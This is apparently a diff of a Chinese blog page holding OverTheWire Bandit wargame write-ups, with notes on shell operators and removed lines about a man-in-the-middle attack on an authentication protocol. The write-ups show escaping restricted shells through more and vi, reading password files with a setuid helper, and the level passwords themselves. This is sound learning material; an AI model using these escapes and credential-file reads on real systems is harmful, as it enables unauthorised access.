+<h1 id="Bandit-Level-25-→-Level-26"><a href="#Bandit-Level-25-→-Level-26" class="headerlink" title="Bandit Level 25 → Level 26"></a>Bandit Level 25 → Level 26</h1><h2 id="Level-Goal-3"><a href="#Level-Goal-3" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not <strong>/bin/bash</strong>, but something else. Find out what it is, how it works and how to break out of it.</p>
+<p>fairly easy…注意审题, 这里有三个点,</p>
+<p>先登录, 果然登录上去就看到有一个sshkey的秘钥, 那直接用命令连接26呗:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ssh -i /home/xusong/temp/bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220</span></span><br></pre></td></tr></table></figure>
+
+<p>一进去就会被断开:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection to bandit.labs.overthewire.org closed.</span><br></pre></td></tr></table></figure>
+
+<p>用ssh后面加command的方法也不行, 确实题目上也说了,  bandit26 is not <strong>/bin/bash</strong> 执行不了shell的指令.</p>
+<p>怎么办, 毫无头绪只有google思路了.</p>
 <ol>
-<li>attacker does not know the key!!</li>
-<li>$N_A$ might be sent by A before!! So E knew the NA before</li>
+<li>求助后, 回到bandit25, 此时去查看/etc/passwd</li>
 </ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash</span><br><span class="line">bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash</span><br><span class="line">bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash</span><br><span class="line">bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash</span><br><span class="line">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span><br><span class="line">bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash</span><br><span class="line">bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash</span><br><span class="line">bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>人群中一眼就看得到, 再细看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat: '/home/bandit26:/usr/bin/showtext': No such file or directory</span><br><span class="line">bandit25@bandit:/etc$ cat /usr/bin/showtext</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">export TERM=linux</span><br><span class="line"></span><br><span class="line">more ~/text.txt</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>搜一搜啥意思, </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh <span class="comment">#是指此脚本使用/bin/sh来解释执行，#! 是特殊的表示符，其后面跟的是解释此脚本的shell的路径</span></span></span><br><span class="line">export TERM=linux #TERM=xterm &lt;== 这个终端机使用的环境是什么类型 </span><br><span class="line">more ~/text.txt #more a file</span><br><span class="line">exit 0 #就退出了</span><br></pre></td></tr></table></figure>
+
+<p>但如何能够使用shell呢?</p>
+<ol start="2">
+<li><p>继续求助</p>
+<p>more是可以执行命令的, 还必须得触发more的情况下, 再输入command.</p>
+<p>如何触发more?需要把窗口设置小一些:</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588851553/Screenshot_from_2020-05-07_13-35-05_fbyprh.png" alt=""></p>
+</li>
+</ol>
+<p>此时按v调用vi编辑器, 通过!command来执行命令, 可惜也不行.</p>
+<ol start="3">
+<li><p>再次偷瞄</p>
+<p>需要用:e file的方法, 切换到其他文件, 因为我们知道密码都是在/etc/bandit_pass/bandit26</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588852335/Screenshot_from_2020-05-07_13-50-37_oekqgo.png" alt=""></p>
+</li>
+</ol>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588852425/Screenshot_from_2020-05-07_13-51-56_l7qmij.png" alt=""></p>
+<p>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p>
+<p>fairly easy, funny mud pee!</p>
+<h1 id="Bandit-Level-26-→-Level-27"><a href="#Bandit-Level-26-→-Level-27" class="headerlink" title="Bandit Level 26 → Level 27"></a>Bandit Level 26 → Level 27</h1><h2 id="Level-Goal-4"><a href="#Level-Goal-4" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>
+<p>本以为有了上一关的密码. 在登录bandit26就会有shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection to bandit.labs.overthewire.org closed.</span><br></pre></td></tr></table></figure>
+
+<p>closed是几个意思. 那这个密码有什么用..充其量就是连接bandit26的时候少输入几个参数?</p>
+<p>再次回到level 25.5 more 后, 拿到vim的阶段.</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588851553/Screenshot_from_2020-05-07_13-35-05_fbyprh.png" alt=""></p>
+<p>还有一种设置shell的方式, 在vim下顺序输入:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line">bandit26@bandit:~$ whoami</span><br><span class="line">bandit26 #finally</span><br></pre></td></tr></table></figure>
+
+<p>再在目录发现了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit26@bandit:~$ ls</span><br><span class="line">bandit27-do  text.txt</span><br></pre></td></tr></table></figure>
+
+<p>text.txt没有用, 试试运行bandit27-do:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bandit26@bandit:~$ ./bandit27-do</span><br><span class="line">Run a command as another user.</span><br><span class="line">  Example: ./bandit27-do id</span><br></pre></td></tr></table></figure>
+
+<p>相当于可以冒充bandit27了, 那就去对应的保险柜拿密码吧</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27</span><br><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure>
+
+<h1 id="Bandit-Level-27-→-Level-28"><a href="#Bandit-Level-27-→-Level-28" class="headerlink" title="Bandit Level 27 → Level 28"></a>Bandit Level 27 → Level 28</h1><h2 id="Level-Goal-5"><a href="#Level-Goal-5" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>There is a git repository at <code>ssh://bandit27-git@localhost/home/bandit27-git/repo</code>. The password for the user <code>bandit27-git</code> is the same as for the user <code>bandit27</code>.</p>
+<p>Clone the repository and find the password for the next level.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bandit27@bandit:~$ cd /tmp</span><br><span class="line">bandit27@bandit:/tmp$ mkdir seven</span><br><span class="line">bandit27@bandit:/tmp$ chmod 777 seven</span><br><span class="line">bandit27@bandit:/tmp$ cd seven</span><br><span class="line">bandit27@bandit:/tmp/seven$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit27-git@localhost's password: </span><br><span class="line"><span class="meta">#</span><span class="bash">题目描述了, 密码就是Level27的开机密码</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bandit27@bandit:/tmp/seven$ ls -la</span><br><span class="line">bandit27@bandit:/tmp/seven/repo$ cat README </span><br><span class="line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure>
+
+<p>0ef186ac70e04ea33b4c1853d2526fa2</p>
+<p>这题不难</p>
+<h1 id="Bandit-Level-28-→-Level-29"><a href="#Bandit-Level-28-→-Level-29" class="headerlink" title="Bandit Level 28 → Level 29"></a>Bandit Level 28 → Level 29</h1><h2 id="Level-Goal-6"><a href="#Level-Goal-6" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>前面与之前一模一样, 但打开readme后, 密码是xxxxxxxx隐藏的;</p>
+<p>盲猜看log</p>
+<p>果然</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit28@bandit:/tmp/seven2/repo$ git log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">commit 073c27c130e6ee407e12faad1dd3848a110c4f95</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    fix info leak</span><br><span class="line"></span><br><span class="line">commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    add missing data</span><br><span class="line"></span><br><span class="line">commit b67405defc6ef44210c53345fc953e6a21338cc7</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Tue Oct 16 14:00:39 2018 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br></pre></td></tr></table></figure>
+
+<p>有一条    fix info leak , 但是找了半天man也没有发现哪条指令可以看指定的这一条, ./git/logs这个文件夹翻遍了也没有找到.</p>
+<p>找到了这篇<a href="https://blog.csdn.net/daguanjia11/article/details/73823617" target="_blank" rel="noopener">文章</a>, 果然是大道至简啊, <code>git show [comit的id号就行了]</code></p>
+<p>bbc96594b4e001778eee9975372716b2</p>
+<h1 id="Bandit-Level-29-→-Level-30"><a href="#Bandit-Level-29-→-Level-30" class="headerlink" title="Bandit Level 29 → Level 30"></a>Bandit Level 29 → Level 30</h1><h2 id="Level-Goal-7"><a href="#Level-Goal-7" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>There is a git repository at <code>ssh://bandit29-git@localhost/home/bandit29-git/repo</code>. The password for the user <code>bandit29-git</code> is the same as for the user <code>bandit29</code></p>
+<p>继续.</p>
+<p>这次打开readme, 里面显示没有密码.</p>
+<p>找了下思路, <a href="https://www.youtube.com/watch?v=68CMwz3wMRE" target="_blank" rel="noopener">莫烦兄弟讲的挺好的</a>, 可以, 用<code>git show-branch --all</code>显示所有branch结构</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588865841/Screenshot_from_2020-05-07_17-37-04_jqpgv2.png" alt=""></p>
+<p>看到silly, shit and giggles 这些关键词, 意味着方向没错.</p>
+<p>看来必须要切换到这些分支下面, 找了下关键词:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout origin/sploits-dev</span><br></pre></td></tr></table></figure>
+
+<p>然后看看log更改信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log -p</span><br></pre></td></tr></table></figure>
+
+<p>找到密码</p>
+<p>5b90576bedb2cc04c86a9e924ce42faf</p>
+<h1 id="Bandit-Level-30-→-Level-31"><a href="#Bandit-Level-30-→-Level-31" class="headerlink" title="Bandit Level 30 → Level 31"></a>Bandit Level 30 → Level 31</h1><h2 id="Level-Goal-8"><a href="#Level-Goal-8" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>git还有一个特性, 是可以给比如一些版本加tag, 比如v1.0什么的</p>
+<p>how to use git tag?</p>
+<figure class="highlight plain"><figcaption><span>tag```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这样就会显示当前的tag, 发现里面有一个叫secret~</span><br><span class="line"></span><br><span class="line">注意我们在建立tag的时候, 只需要 &#96;&#96;&#96;git tag 我是名字&#96;&#96;&#96;就可以建立一个tag</span><br><span class="line"></span><br><span class="line">也可以用&#96;&#96;&#96;git tag 特朗普 -m &quot;又名特建国&quot;&#96;&#96;&#96;,这样就可以给tag加附加信息</span><br><span class="line"></span><br><span class="line">猜测应该是在建立tag的时候, 附件了密码信息</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line">bandit30@bandit:&#x2F;tmp&#x2F;seven23&#x2F;repo$ git show secret</span><br><span class="line">warning: refname &#39;secret&#39; is ambiguous.</span><br><span class="line">47e603bb428404d265f59c42920d81e5</span><br></pre></td></tr></table></figure>
+
+<p>ach so.</p>
+<p>47e603bb428404d265f59c42920d81e5</p>
+<h1 id="Bandit-Level-31-→-Level-32"><a href="#Bandit-Level-31-→-Level-32" class="headerlink" title="Bandit Level 31 → Level 32"></a>Bandit Level 31 → Level 32</h1><h2 id="Level-Goal-9"><a href="#Level-Goal-9" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>There is a git repository at <code>ssh://bandit31-git@localhost/home/bandit31-git/repo</code>. The password for the user <code>bandit31-git</code> is the same as for the user <code>bandit31</code>.</p>
+<p>上来还是三板斧, 看到README.MD</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit31@bandit:/tmp/seven31/repo$ cat README.md </span><br><span class="line">This time your task is to push a file to the remote repository.</span><br><span class="line">Details:</span><br><span class="line">    File name: key.txt</span><br><span class="line">    Content: 'May I come in?'</span><br><span class="line">    Branch: master</span><br></pre></td></tr></table></figure>
+
+<p>这次需要项目中, 更改修订用git的方式去完成</p>
+<p>回忆的大概流程, 可能不是完全准确:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch key.txt</span><br><span class="line">vim key.txt #里面再编辑,注意编辑内容就不要加引号了</span><br><span class="line"><span class="meta">#</span><span class="bash">or</span></span><br><span class="line">echo "May I come in?" &gt; key.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add key.txt</span><br><span class="line">rm .gitignore#这个文件会影响文件的add</span><br><span class="line">git status #期间可以一直用这个命令看状态</span><br><span class="line">git commit -m "whatever"</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote#拿到remote的名字,返回的origin</span><br><span class="line">git push origin</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<ul>
-<li><p>With shared key and without the identification, protocol above is easy to be attacked by Man-in-the-middle attack. For example:</p>
-<ol>
-<li><p>$$A \rightarrow E : {N_A}^s_k$$</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bandit31-git@localhost&#39;s password: </span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 2 threads.</span><br><span class="line">Compressing objects: 100% (4&#x2F;4), done.</span><br><span class="line">Writing objects: 100% (6&#x2F;6), 535 bytes | 0 bytes&#x2F;s, done.</span><br><span class="line">Total 6 (delta 1), reused 0 (delta 0)</span><br><span class="line">remote: ### Attempting to validate files... ####</span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br><span class="line">remote: Well done! Here is the password for the next level:</span><br><span class="line">remote: 56a9bf19c63d650ce78e6ec0354ee45e#夜空中最亮的星</span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br><span class="line">remote: Wrong!</span><br><span class="line">remote: </span><br><span class="line">remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.</span><br><span class="line">remote: </span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="Bandit-Level-32-→-Level-33"><a href="#Bandit-Level-32-→-Level-33" class="headerlink" title="Bandit Level 32 → Level 33"></a>Bandit Level 32 → Level 33</h1><h2 id="Level-Goal-10"><a href="#Level-Goal-10" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>After all this <code>git</code> stuff its time for another escape. Good luck!</p>
+<p>Welcome to uppercase world..</p>
+<blockquote>
+<blockquote>
+<p>ls<br>sh: 1: LS: not found</p>
+</blockquote>
+</blockquote>
+<p>果然全是大写, 执行variable <code>$0</code> 可以回到普通shell</p>
+<p><code>$ cat /etc/bandit_pass/bandit33</code><br>c9c3199ddf4121b10cf581a98d51caee</p>
+<p>做了一天好累</p>
+<h1 id="Bandit-Level-33-→-Level-34"><a href="#Bandit-Level-33-→-Level-34" class="headerlink" title="Bandit Level 33 → Level 34"></a>Bandit Level 33 → Level 34</h1><p><strong>At this moment, level 34 does not exist yet.</strong></p>
+<p>这不是巧了吗这不是 </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/06/%E7%AC%A6%E5%8F%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Seven ♂">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Seven's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/06/%E7%AC%A6%E5%8F%B7/" itemprop="url">符号</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-06T10:44:09+02:00">
+                2020-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li><p>Semi-colon Operator (;)<code>命令1;命令2</code>    顺序执行,1再2</p>
 </li>
-<li><p>$$E \rightarrow B : {N_A}^s_k$$</p>
+<li><p>Or Operator(||)<code>命令1||命令2</code>    先执行命令1, 命令2是备胎命令, 不行再考虑, 所以可以推断, 千斤顶就是再加一个||</p>
 </li>
-<li><p>$$B \rightarrow E : {N_B}^s_k, N_A$$</p>
+<li><p>And Operator(&amp;&amp;)<code>命令1&amp;&amp;命令2</code>    先执行命令1, 再看命令2女方的意思</p>
 </li>
-<li><p>$$E \rightarrow A : {N_B}^s_k, N_A$$</p>
-</li>
-<li><p>$$A \rightarrow E : N_B$$</p>
-</li>
-<li><p>$$E \rightarrow B : N_B$$</p>
+<li><p>Pipe Operator(|)<code>命令1|命令2</code>    命令1的输出, 作为命令2的输入, 这个名字取得真是貌合神离.</p>
+<p>我现在最常用的就是</p>
 </li>
 </ol>
-</li>
-<li><p>Adversary Eve just interpreted the messages between Alice and Bob, Alick thought she set up a session with Bob, but it is from the Eve who impersonate the Bob, the other way around as Bob, He set up a fake session with Eve as well, additionally the both Nonces are not encrypted. So authentication is violated.</p>
-</li>
-</ul>
-</blockquote>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588942650/Screenshot_from_2020-05-08_14-57-21_jd0hta.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588941845/Screenshot_from_2020-05-08_14-42-32_fgg8lw.png" alt=""></p>
-<p>==P4 Answer:==</p>
-<p>The essential of attack is to take use the fourth step, in precise to construct a suitable message, take the output from B in 2nd session, then sent it to B in 1st session.</p>
-<p>Below is the message flow:</p>
-<p>1.1.    $I(A) -&gt;  B :   A ,B$</p>
-<p>1.2.     $B -&gt;  I(A) :   B ,N_{B1}$</p>
-<p>1.3.     $ I(A) -&gt;  B :   Random-string$</p>
-<p>1.4.    $B -&gt; I(S) :Random - string, { A,B,B,N_{B_1} }^s_{Kbs}$</p>
-<p>2.1.     $I(A) -&gt;  B :   A ,N_{B1}$</p>
-<p>2.2.     $B -&gt;  I(A) :   B ,N_{B2}$</p>
-<p>2.3.     $I(A) - &gt; B:Random-string$</p>
-<p>2.4.    $B -&gt; I(S) :Random - string, { A,B,N_{B_1},N_{B_2}}^s_{Kbs}$</p>
-<p>1.5.    $I(S) -&gt; B :Random - string, { A,B,N_{B_1},N_{B_2}}^s_{Kbs}$</p>
-<p>1.6.    $B -&gt; I(A) :Random - string, { B, N_{B_1}}N_{B_2}$</p>
-<p>1.7.    $I(A) -&gt; B :{N_{B_1}}N_{B_2}$</p>
-<p>Furthermore:<img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588942709/Screenshot_from_2020-05-08_14-58-21_auvhpq.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man ssh|grep 'pass*'</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>Ampersand Operator <code>命令1&amp;命令2</code>    命令1后台执行, 执行命令2</li>
+</ol>
+<p>之前一直不太明白, 后来想通了, 如果远程连接服务器只有一个command窗口, 遇到装nvm install xx.xx.xx这种命令一装就是大半个小时, 光等就效率太低了. 因为自己一直用ubuntu桌面版这种系统, command可以多开, 所以没有朝这个方向去想.</p>
+<p>以前学的C语言中,</p>
+<p>&amp;&amp; || 是逻辑与或             </p>
+<p>&amp;  |  是按位与或, 经常用的比如 0xfff0 &amp; A 就是低位置0, 高位保持, 并保证32bit</p>
+<p>不知道有没有什么联系</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/06/OvertheWire/Bandit17-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Seven ♂">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Seven's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/06/OvertheWire/Bandit17-22/" itemprop="url">Bandit18-22</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-06T09:13:18+02:00">
+                2020-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OvertheWire/" itemprop="url" rel="index">
+                    <span itemprop="name">OvertheWire</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Bandit-Level-17-→-Level-18"><a href="#Bandit-Level-17-→-Level-18" class="headerlink" title="Bandit Level 17 → Level 18"></a>Bandit Level 17 → Level 18</h1><p>try to learn how to use diff</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">diff [OPTION]... FILES</span><br><span class="line">diff passwords.new passwords.old</span><br></pre></td></tr></table></figure>
+
+<p>kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</p>
+<p>hlbSBPAWJmL6WFDb06gpTx1pPButblOA</p>
+<h1 id="Bandit-18-19"><a href="#Bandit-18-19" class="headerlink" title="Bandit 18 -19"></a>Bandit 18 -19</h1><p>还是太菜了, 以为是用||接命令, man里其实写得很清楚</p>
+<p>ssh ……. [user@]hostname [command]</p>
+<p>可以直接在后面接命令的:</p>
+<figure class="highlight plain"><figcaption><span>ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br><span class="line"></span><br><span class="line"># Bandit 19-20</span><br><span class="line"></span><br><span class="line">## Level Goal</span><br><span class="line"></span><br><span class="line">To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (&#x2F;etc&#x2F;bandit_pass), after you have used the setuid binary.</span><br><span class="line"></span><br><span 